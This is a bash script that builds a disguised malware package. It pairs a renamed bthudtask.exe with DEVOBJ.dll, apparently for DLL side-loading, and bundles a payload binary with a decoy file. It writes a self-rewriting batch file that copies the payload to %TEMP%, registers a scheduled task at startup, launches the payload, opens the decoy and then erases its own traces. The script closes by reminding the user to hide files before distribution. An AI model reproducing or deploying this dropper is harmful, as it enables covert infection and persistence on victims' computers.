#!/bin/bash
set -e


BIN_PATH=$1 # Path to karma binary to deploy
ARCHIVE=$2 # Archive name
DATA_PATH=$4 # path to dummy data

[ -f "$BIN_PATH" ] || { echo "error: $BIN_PATH does not exist."; exit 1; }
[ -f "$DATA_PATH" ] || { echo "error: $DATA_PATH does not exist."; exit 1; }

OLDDIR=$PWD
cp $BIN_PATH $(dirname $0)
cp $DATA_PATH $(dirname $0)
cd $(dirname $0)

mkdir $ARCHIVE 
cp bthudtask.exe ${ARCHIVE}.exe
mv ${ARCHIVE}.exe $ARCHIVE
cp DEVOBJ.dll $ARCHIVE

BIN=$(basename $BIN_PATH)
DATA=$(basename $DATA_PATH)

mv $BIN $ARCHIVE
mv $DATA $ARCHIVE

# move pe to temp folder
echo "move $BIN %TEMP%\\$BIN" > data.bat
# create schedules task for pe
echo "schtasks /create /sc ONSTART /tn $(echo $BIN | cut -d. -f1 ) /tr %TEMP%\\$BIN" >> data.bat
# start pe
echo "%TEMP%\\$BIN" >> data.bat
# start dummy data
echo "start $DATA" >> data.bat
# rewrite file to only start dummy data whenever program is run
echo "echo start $DATA> data.bat" >> data.bat
mv data.bat $ARCHIVE

mv ${ARCHIVE} $OLDDIR

echo "folder saved at ./${ARCHIVE}/"
echo "make appropriate files hidden before distribution!"